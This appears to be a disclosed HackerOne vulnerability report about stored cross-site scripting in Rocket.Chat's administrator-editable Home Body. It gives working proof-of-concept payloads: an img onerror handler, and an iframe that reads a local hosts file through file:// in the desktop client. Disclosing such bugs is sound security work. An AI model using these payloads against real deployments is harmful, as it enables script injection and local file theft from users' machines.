# XSS (leads to arbitrary file read in Rocket.Chat-Desktop)

## Report Details
- **Report ID**: 724153
- **URL**: https://hackerone.com/reports/724153
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-10-28T19:11:09.189Z
- **Disclosed**: 2020-01-02T16:19:08.554Z

## Reporter
- **Username**: sectex
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rocket_chat

## Vulnerability Information
**Description:** Rocket.Chat allows administrative users to customize the home body. Since `<script>` tags are removed, I think that running scripts should not be allowed. However, event handlers are not removed, allowing you to inject your own scripts.

## Releases Affected:

  * Rocket.Chat-Desktop-Client: v2.15.5
  * Rocket.Chat-Server: v2.0.0
  * Apps-Engine-Version: v1.5.2

## Steps To Reproduce (from initial installation to vulnerability):

  - Go to `Administration » Layout » Content`
  - Set `Home Body` to `<img src=0 onerror="alert(0)"/>`
  - Visit `/home`

### Arbitrary file read in Rocket.Chat-Desktop

  - Go to `Administration » Layout » Content`
  - Set `Home Body` to `<iframe src="file://c:/windows/system32/drivers/etc/hosts" onload="alert(iframe.contentDocument.body.innerHTML)" id="iframe"></iframe>`
  - Visit `/home`

## Supporting Material/References:

  * {F613006}
  * {F613007}
  * {F620074}

## Impact

* Attackers can execute scripts which leads to arbitrary file read and rce in Rocket.Chat-Desktop

## Attachments
- admin-panel.png
- alert.png
- arbitrary_file_read.mp4
